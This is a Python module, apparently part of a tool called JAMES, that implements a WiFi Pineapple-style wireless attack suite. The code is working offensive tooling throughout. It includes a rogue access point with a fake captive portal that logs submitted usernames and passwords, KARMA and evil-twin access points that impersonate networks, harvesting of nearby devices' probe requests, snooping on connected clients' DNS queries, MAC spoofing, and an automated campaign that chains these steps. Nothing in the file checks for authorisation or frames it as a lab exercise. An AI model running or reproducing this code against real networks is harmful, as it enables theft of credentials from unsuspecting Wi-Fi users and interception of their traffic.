"""
PineAP — WiFi Pineapple-equivalent attack suite for JAMES.

Implements: Evil Portal, KARMA, Probe Harvester, Client Tracker,
DNS Snooper, MAC Spoofer. Uses hostapd, dnsmasq, iptables, tcpdump.
"""

import json, logging, os, re, shutil, subprocess, threading, time
from datetime import datetime
from http.server import HTTPServer, SimpleHTTPRequestHandler
from pathlib import Path
from urllib.parse import parse_qs

logger = logging.getLogger("james.pineap")

PORTALS_DIR = Path(__file__).parent / "evil_portals"
CREDS_LOG = Path.home() / ".james" / "pineap_creds.json"
PROBES_LOG = Path.home() / ".james" / "pineap_probes.json"


class _CaptiveHandler(SimpleHTTPRequestHandler):
    """HTTP handler that serves the portal page and harvests POST creds."""

    portal_html = ""
    creds_file = CREDS_LOG

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(self.portal_html.encode())

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode()
        creds = parse_qs(body)
        flat = {k: v[0] if len(v) == 1 else v for k, v in creds.items()}
        flat["_time"] = datetime.now().isoformat()
        flat["_client_ip"] = self.client_address[0]

        # Append to log
        self.creds_file.parent.mkdir(parents=True, exist_ok=True)
        existing = []
        if self.creds_file.exists():
            try:
                existing = json.loads(self.creds_file.read_text())
            except Exception as e:
                logger.warning("Failed to parse existing creds file: %s", e)
        existing.append(flat)
        self.creds_file.write_text(json.dumps(existing, indent=2))
        logger.info("CRED CAPTURED: %s", flat)

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, fmt, *args):
        pass  # Suppress HTTP logs


class PineAP:
    """WiFi Pineapple-style attack engine."""

    def __init__(self, layer):
        self.layer = layer
        self._procs: list[subprocess.Popen] = []
        self._http_server = None
        self._http_thread = None
        self._probe_thread = None
        self._probing = False

    # ── Evil Portal ─────────────────────────────────────────────

    def start_evil_portal(
        self,
        interface: str,
        ssid: str,
        channel: int = 6,
        portal: str = "wifi_login",
        internet_iface: str = "eth0",
    ) -> dict:
        """Launch rogue AP with captive portal credential harvesting."""
        portal_path = PORTALS_DIR / f"{portal}.html"
        if not portal_path.exists():
            return {"error": f"Portal template not found: {portal}"}

        _CaptiveHandler.portal_html = portal_path.read_text()

        # 1. Write hostapd config
        hostapd_conf = f"""interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        Path("/tmp/james_hostapd.conf").write_text(hostapd_conf)

        # 2. Write dnsmasq config (redirect ALL DNS to us)
        dnsmasq_conf = f"""interface={interface}
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
log-facility=/tmp/james_dns.log
listen-address=10.0.0.1
address=/#/10.0.0.1
"""
        Path("/tmp/james_dnsmasq.conf").write_text(dnsmasq_conf)

        # 3. Network setup
        cmds = [
            f"ifconfig {interface} up 10.0.0.1 netmask 255.255.255.0",
            "echo 1 > /proc/sys/net/ipv4/ip_forward",
            "iptables --flush && iptables --table nat --flush",
            f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j REDIRECT --to-port 8080",
            f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j REDIRECT --to-port 8080",
            f"iptables -t nat -A POSTROUTING -o {internet_iface} -j MASQUERADE",
            f"iptables -A FORWARD -i {interface} -o {internet_iface} -j ACCEPT",
        ]
        for cmd in cmds:
            self.layer.run(cmd, sudo=True, timeout=5)

        # 4. Launch hostapd + dnsmasq
        h = self.layer.run_background(
            "hostapd /tmp/james_hostapd.conf", sudo=True
        )
        self._procs.append(h)
        time.sleep(2)
        d = self.layer.run_background(
            "dnsmasq -C /tmp/james_dnsmasq.conf -d", sudo=True
        )
        self._procs.append(d)
        time.sleep(1)

        # 5. Start captive portal HTTP server
        self._http_server = HTTPServer(("0.0.0.0", 8080), _CaptiveHandler)
        self._http_thread = threading.Thread(
            target=self._http_server.serve_forever, daemon=True
        )
        self._http_thread.start()

        return {
            "status": "active",
            "ssid": ssid,
            "portal": portal,
            "gateway": "10.0.0.1",
            "creds_log": str(CREDS_LOG),
        }

    # ── KARMA Attack ────────────────────────────────────────────

    def start_karma(
        self, interface: str, channel: int = 6, internet_iface: str = "eth0"
    ) -> dict:
        """KARMA mode: respond to ALL probe requests with matching SSID.

        Uses hostapd-mana or hostapd with karma patch if available,
        falls back to a scan-and-spoof loop otherwise.
        """
        # Check for hostapd-mana (KARMA-capable)
        has_mana = shutil.which("hostapd-mana") is not None

        if has_mana:
            conf = f"""interface={interface}
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel={channel}
enable_karma=1
karma_loud=1
"""
            Path("/tmp/james_karma.conf").write_text(conf)
            proc = self.layer.run_background(
                "hostapd-mana /tmp/james_karma.conf", sudo=True
            )
            self._procs.append(proc)
        else:
            # Fallback: harvest probes and create matching APs
            conf = f"""interface={interface}
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel={channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
"""
            Path("/tmp/james_karma.conf").write_text(conf)
            proc = self.layer.run_background(
                "hostapd /tmp/james_karma.conf", sudo=True
            )
            self._procs.append(proc)

        # Setup network
        self.layer.run(
            f"ifconfig {interface} up 10.0.0.1 netmask 255.255.255.0",
            sudo=True,
            timeout=5,
        )
        self.layer.run(
            "echo 1 > /proc/sys/net/ipv4/ip_forward", sudo=True, timeout=5
        )

        dnsmasq_conf = f"""interface={interface}
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-facility=/tmp/james_dns.log
listen-address=10.0.0.1
"""
        Path("/tmp/james_dnsmasq.conf").write_text(dnsmasq_conf)
        d = self.layer.run_background(
            "dnsmasq -C /tmp/james_dnsmasq.conf -d", sudo=True
        )
        self._procs.append(d)

        return {"status": "active", "mode": "karma", "mana": has_mana}

    # ── Probe Request Harvester ─────────────────────────────────

    def harvest_probes(self, interface: str, duration: int = 60) -> dict:
        """Passively capture probe requests to discover client SSIDs."""
        result = self.layer.run(
            f"timeout {duration} tcpdump -i {interface} -e -s 256 "
            f"'subtype probe-req' -l 2>/dev/null",
            sudo=True,
            timeout=duration + 10,
        )
        probes = []
        seen = set()
        for line in result.stdout.splitlines():
            # Extract MAC and SSID from probe requests
            mac_match = re.search(r"SA:([0-9a-fA-F:]{17})", line)
            ssid_match = re.search(r"Probe Request \(([^)]+)\)", line)
            if mac_match:
                mac = mac_match.group(1)
                ssid = ssid_match.group(1) if ssid_match else "(broadcast)"
                key = f"{mac}:{ssid}"
                if key not in seen:
                    seen.add(key)
                    probes.append(
                        {
                            "mac": mac,
                            "ssid": ssid,
                            "time": datetime.now().isoformat(),
                        }
                    )

        # Also try tshark if tcpdump didn't get much
        if len(probes) < 3:
            tshark = self.layer.run(
                f"timeout {duration} tshark -i {interface} "
                f"-Y 'wlan.fc.type_subtype == 0x04' "
                f"-T fields -e wlan.sa -e wlan_mgt.ssid 2>/dev/null",
                sudo=True,
                timeout=duration + 10,
            )
            for line in tshark.stdout.splitlines():
                parts = line.strip().split("\t")
                if parts:
                    mac = parts[0] if parts else ""
                    ssid = parts[1] if len(parts) > 1 else "(broadcast)"
                    key = f"{mac}:{ssid}"
                    if key not in seen:
                        seen.add(key)
                        probes.append(
                            {
                                "mac": mac,
                                "ssid": ssid,
                                "time": datetime.now().isoformat(),
                            }
                        )

        # Save probes
        PROBES_LOG.parent.mkdir(parents=True, exist_ok=True)
        PROBES_LOG.write_text(json.dumps(probes, indent=2))

        return {"count": len(probes), "probes": probes, "log": str(PROBES_LOG)}

    # ── Client Tracker ──────────────────────────────────────────

    def track_clients(self, interface: str = None) -> dict:
        """List clients connected to our rogue AP via ARP + DHCP leases."""
        clients = []

        # ARP table
        arp = self.layer.run("arp -a 2>/dev/null", timeout=5)
        for line in arp.stdout.splitlines():
            m = re.match(
                r"(\S+)\s+\((\d+\.\d+\.\d+\.\d+)\)\s+at\s+([0-9a-fA-F:]+)",
                line,
            )
            if m and m.group(2).startswith("10.0.0."):
                clients.append(
                    {
                        "hostname": m.group(1),
                        "ip": m.group(2),
                        "mac": m.group(3),
                        "source": "arp",
                    }
                )

        # DHCP leases
        for lease_file in [
            "/var/lib/misc/dnsmasq.leases",
            "/tmp/dnsmasq.leases",
        ]:
            self.layer.run(
                f"chmod 644 {lease_file} 2>/dev/null", sudo=True, timeout=2
            )
            if os.path.exists(lease_file):
                try:
                    for line in open(lease_file):
                        parts = line.strip().split()
                        if len(parts) >= 4:
                            clients.append(
                                {
                                    "mac": parts[1],
                                    "ip": parts[2],
                                    "hostname": parts[3],
                                    "source": "dhcp",
                                }
                            )
                except Exception as e:
                    logger.debug(
                        "Failed to read DHCP leases %s: %s", lease_file, e
                    )

        # Dedupe by MAC
        seen = {}
        for c in clients:
            seen[c["mac"]] = c
        return {"count": len(seen), "clients": list(seen.values())}

    # ── DNS Snooper ─────────────────────────────────────────────

    def snoop_dns(self, limit: int = 50) -> dict:
        """Parse DNS queries from connected clients (from dnsmasq log)."""
        log_path = "/tmp/james_dns.log"
        queries = []
        # Ensure the file is readable by our user (dnsmasq creates it as root)
        self.layer.run(
            f"chmod 644 {log_path} 2>/dev/null", sudo=True, timeout=2
        )

        if os.path.exists(log_path):
            try:
                for line in open(log_path):
                    m = re.search(
                        r"query\[(\w+)\]\s+(\S+)\s+from\s+(\S+)", line
                    )
                    if m:
                        queries.append(
                            {
                                "type": m.group(1),
                                "domain": m.group(2),
                                "client": m.group(3),
                            }
                        )
            except Exception as e:
                logger.debug("Failed to read DNS log: %s", e)
        return {"count": len(queries), "queries": queries[-limit:]}

    # ── MAC Spoofer ─────────────────────────────────────────────

    def spoof_mac(self, interface: str, mac: str = None) -> dict:
        """Randomize or set specific MAC address using macchanger."""
        self.layer.run(f"ip link set {interface} down", sudo=True, timeout=5)
        if mac:
            result = self.layer.run(
                f"macchanger -m {mac} {interface}", sudo=True, timeout=5
            )
        else:
            result = self.layer.run(
                f"macchanger -r {interface}", sudo=True, timeout=5
            )
        self.layer.run(f"ip link set {interface} up", sudo=True, timeout=5)

        new_mac_match = re.search(r"New MAC:\s+([0-9a-fA-F:]+)", result.stdout)
        new_mac = new_mac_match.group(1) if new_mac_match else "unknown"
        return {"success": result.returncode == 0, "new_mac": new_mac}

    # ── Get Harvested Creds ─────────────────────────────────────

    def get_creds(self) -> list:
        """Return all harvested credentials from the portal."""
        if CREDS_LOG.exists():
            try:
                return json.loads(CREDS_LOG.read_text())
            except Exception as e:
                logger.warning("Failed to read creds log %s: %s", CREDS_LOG, e)
                return []
        return []

    # ── Combined KARMA + Portal ─────────────────────────────────

    def start_karma_with_portal(
        self,
        interface: str,
        channel: int = 6,
        ssid: str = "Free_WiFi",
        portal: str = "wifi_login",
        internet_iface: str = "eth0",
        bssid: str = None,
    ) -> dict:
        """Launch KARMA mode combined with an Evil Portal.

        1. hostapd-mana (KARMA) or hostapd fallback — respond to ALL probes
        2. dnsmasq — DHCP + DNS redirect to our captive portal
        3. iptables — redirect HTTP/HTTPS to portal
        4. HTTP credential harvester on port 8080
        """
        # Portal template
        portal_path = PORTALS_DIR / f"{portal}.html"
        if portal_path.exists():
            _CaptiveHandler.portal_html = portal_path.read_text()
        else:
            _CaptiveHandler.portal_html = (
                "<html><body><h1>Welcome</h1>"
                "<form method=POST><input name=email placeholder=Email>"
                "<input name=password type=password placeholder=Password>"
                "<button>Connect</button></form></body></html>"
            )

        has_mana = shutil.which("hostapd-mana") is not None

        bssid_line = f"bssid={bssid}" if bssid else ""

        if has_mana:
            conf = f"""interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
enable_karma=1
karma_loud=1
{bssid_line}
"""
        else:
            conf = f"""interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
{bssid_line}
"""
        Path("/tmp/james_karma.conf").write_text(conf)
        hostapd_bin = "hostapd-mana" if has_mana else "hostapd"
        proc = self.layer.run_background(
            f"{hostapd_bin} /tmp/james_karma.conf", sudo=True
        )
        self._procs.append(proc)

        # Network setup
        cmds = [
            f"ifconfig {interface} up 10.0.0.1 netmask 255.255.255.0",
            "echo 1 > /proc/sys/net/ipv4/ip_forward",
            "iptables --flush && iptables --table nat --flush",
            f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j REDIRECT --to-port 8080",
            f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j REDIRECT --to-port 8080",
            f"iptables -t nat -A POSTROUTING -o {internet_iface} -j MASQUERADE",
            f"iptables -A FORWARD -i {interface} -o {internet_iface} -j ACCEPT",
        ]
        for cmd in cmds:
            self.layer.run(cmd, sudo=True, timeout=5)

        # dnsmasq
        dnsmasq_conf = f"""interface={interface}
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
log-facility=/tmp/james_dns.log
listen-address=10.0.0.1
address=/#/10.0.0.1
"""
        Path("/tmp/james_dnsmasq.conf").write_text(dnsmasq_conf)
        d = self.layer.run_background(
            "dnsmasq -C /tmp/james_dnsmasq.conf -d", sudo=True
        )
        self._procs.append(d)
        time.sleep(1)

        # Captive portal HTTP server
        try:
            if self._http_server:
                self._http_server.shutdown()
        except Exception as e:
            logger.debug("HTTP server shutdown during restart: %s", e)
        self._http_server = HTTPServer(("0.0.0.0", 8080), _CaptiveHandler)
        self._http_thread = threading.Thread(
            target=self._http_server.serve_forever, daemon=True
        )
        self._http_thread.start()

        return {
            "status": "active",
            "mode": "karma+portal",
            "mana": has_mana,
            "ssid": ssid,
            "portal": portal,
            "gateway": "10.0.0.1",
            "creds_log": str(CREDS_LOG),
        }

    # ── Live Status Snapshot ────────────────────────────────────

    def get_live_status(self) -> dict:
        """Return a snapshot of the current attack state for GUI polling."""
        clients = self.track_clients()
        dns = self.snoop_dns(limit=100)
        creds = self.get_creds()
        return {
            "clients": clients.get("clients", []),
            "client_count": clients.get("count", 0),
            "dns_queries": dns.get("queries", []),
            "dns_count": dns.get("count", 0),
            "creds": creds,
            "cred_count": len(creds),
        }

    # ── Stop All ────────────────────────────────────────────────

    def stop_all(self) -> dict:
        """Clean shutdown of all PineAP services."""
        # Stop HTTP server
        if self._http_server:
            self._http_server.shutdown()
            self._http_server = None

        # Kill background processes
        for proc in self._procs:
            try:
                proc.terminate()
                proc.wait(timeout=3)
            except Exception as e:
                logger.debug(
                    "Graceful terminate failed (PID %s): %s — force killing",
                    proc.pid,
                    e,
                )
                try:
                    proc.kill()
                except Exception as e2:
                    logger.warning(
                        "Force kill failed (PID %s): %s", proc.pid, e2
                    )
        self._procs.clear()

        # Kill any lingering hostapd/dnsmasq
        self.layer.run(
            "killall hostapd dnsmasq hostapd-mana 2>/dev/null",
            sudo=True,
            timeout=5,
        )

        # Flush iptables
        self.layer.run(
            "iptables --flush && iptables --table nat --flush",
            sudo=True,
            timeout=5,
        )
        self.layer.run(
            "echo 0 > /proc/sys/net/ipv4/ip_forward", sudo=True, timeout=5
        )

        return {"status": "stopped"}

    # ── Evil Twin ────────────────────────────────────────────────

    def start_evil_twin(
        self,
        interface: str,
        bssid: str = "",
        ssid: str = "",
        channel: int = 6,
        portal: str = "wifi_login",
        internet_iface: str = "eth0",
    ) -> dict:
        """Clone a specific AP (by BSSID/SSID) and launch a captive portal.

        If *ssid* is empty, it falls back to a generic 'FreeWiFi' AP.
        This is a targeted variant of start_evil_portal.
        """
        target_ssid = ssid or "FreeWiFi"
        target_channel = channel or 6

        # If we have a BSSID, try to read the SSID from the ARP cache / scan
        if bssid and not ssid:
            r = self.layer.run(
                f"iw dev {interface} scan 2>/dev/null | grep -A1 {bssid}",
                timeout=10,
            )
            for line in r.stdout.splitlines():
                if "SSID:" in line:
                    target_ssid = line.split("SSID:", 1)[1].strip()
                    break

        result = self.start_evil_portal(
            interface,
            ssid=target_ssid,
            channel=target_channel,
            portal=portal,
            internet_iface=internet_iface,
        )
        result["bssid_cloned"] = bssid
        return result

    def start_full_campaign(
        self,
        interface: str,
        channel: int = 6,
        portal: str = "wifi_login",
        internet_iface: str = "eth0",
        probe_duration: int = 30,
    ) -> dict:
        """Full Pineapple campaign: probe harvest → KARMA AP → captive portal.

        Steps:
          1. Harvest probe requests from nearby clients (30s)
          2. Launch KARMA mode (respond to all probes)
          3. Serve captive portal
          4. Return live status snapshot
        """
        import time

        log: list[str] = []

        # Step 1: Harvest probes
        log.append(f"[1/3] Harvesting probe requests on {interface} ({probe_duration}s)...")
        probes = self.harvest_probes(interface, duration=probe_duration)
        ssids_seen = [p.get("ssid", "") for p in probes.get("probes", []) if p.get("ssid")]
        log.append(f"  Probes captured: {len(ssids_seen)} unique SSIDs")

        # Step 2: KARMA attack
        log.append("[2/3] Launching KARMA attack...")
        karma = self.start_karma(interface, channel=channel, internet_iface=internet_iface)
        log.append(f"  KARMA status: {karma.get('status', 'unknown')}")
        time.sleep(3)

        # Step 3: Captive portal
        log.append("[3/3] Launching captive portal...")
        # Use most-probed SSID if available
        ssid = ssids_seen[0] if ssids_seen else "FreeWiFi"
        portal_result = self.start_evil_portal(
            interface,
            ssid=ssid,
            channel=channel,
            portal=portal,
            internet_iface=internet_iface,
        )
        log.append(f"  Portal active — SSID: {ssid}, Gateway: {portal_result.get('gateway')}")

        return {
            "status": "active",
            "log": log,
            "ssid": ssid,
            "probes_seen": len(ssids_seen),
            "creds_log": str(CREDS_LOG),
            "portal": portal_result,
        }
